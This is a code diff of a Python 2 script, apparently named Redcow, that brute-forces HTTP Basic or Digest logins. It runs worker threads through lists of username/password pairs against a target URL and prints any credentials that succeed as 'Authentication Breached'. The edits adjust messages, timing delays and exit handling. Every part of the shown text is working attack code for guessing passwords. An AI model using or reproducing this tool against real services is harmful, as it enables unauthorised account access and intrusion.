@@ -40,15 +40,15 @@ class Redcow():
             sys.stdout.write('%s\r' % msg)
             sys.stdout.flush()
             sys.stdout.write('\n')
-            print "[x] ---> URL: '%s' replied with a 'Connection Refused' status. Exiting." % self.url
+            print "\n\t[INFO] - Address: '%s' replied with a 'Connection Refused' status\n" % self.url
             sys.exit(2)
 
         if not r.status_code == 401:
             msg = msg + "\033[91m\033[1mERROR\033[0m"
             sys.stdout.write('%s\r' % msg)
             sys.stdout.flush()
-            #sys.stdout.write('\n')
-            print "[x] URL '%s' did not reply with HTTP authentication request. Exiting." % self.url
+            sys.stdout.write('\n')
+            print "\n\t[INFO] - Address '%s' did not reply with a HTTP authentication request\n" % self.url
             sys.exit(2)
         else:
             msg = msg + "\033[92m\033[1mDONE!\033[0m"
@@ -70,7 +70,6 @@ class Redcow():
             for worker in xrange(self.workers):
                 thread = Thread(target=self._break_auth)
                 thread.daemon = True
-                #print "Starting thread # %s" % str(worker)
                 thread.start()
 
     def _parse_list(self, x):
@@ -102,7 +101,7 @@ class Redcow():
                 sys.stdout.flush()
                 self.queue_print.task_done()
             else:
-                sleep(0.15)
+                sleep(0.25)
 
     def _break_auth(self):
         while True:
@@ -110,7 +109,7 @@ class Redcow():
                 creds = self.queue_creds.get()
                 msg = "[+] Attempting authentication - "
                 self.queue_print.put(msg)
-                sleep(0.1)
+                sleep(0.5)
 
                 if self.auth_scheme == 'basic':
                     r = requests.post(self.url, auth=(creds["username"], creds["password"]))
@@ -120,19 +119,20 @@ class Redcow():
                     print "Error. Exiting"
                     sys.exit(1)
 
+
                 if r.status_code == 200:
                     msg = msg + "\033[92m\033[1mSUCCESS!\033[0m"
                     self.queue_print.put(msg)
-                    sleep(0.2)
+                    sleep(0.5)
                     print '\n'
                     print "[!] '%s' \033[92m\033[1mAuthentication Breached\033[0m using User: '\033[1m%s\033[0m' and Password: '\033[1m%s\033[0m'\n" % (self.auth_scheme.capitalize(), creds['username'], creds['password'])
-                    sys.exit(1)
+                    self.queue_creds.empty()
+                    sys.exit(0)
                 else:
                     self.queue_creds.task_done()
                     del creds
             else:
-                sleep(0.25)
-                break
+                sleep(0.5)
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
@@ -148,5 +148,13 @@ if __name__ == '__main__':
     oQueue = Thread(target=Moo.printQueue)
     oQueue.daemon = True
     oQueue.start()
-    Moo.queue_creds.join()
     Moo.queue_print.join()
+    Moo.queue_creds.join()
+
+    if Moo.queue_creds.not_empty is not True:
+        msg = "[+] Attempting authentication - \033[91m\033[1mFAILURE!\033[0m\n"
+        sys.stdout.write('%s\r' % msg)
+        sys.stdout.flush()
+        print "\n"
+        sys.exit(0)
+
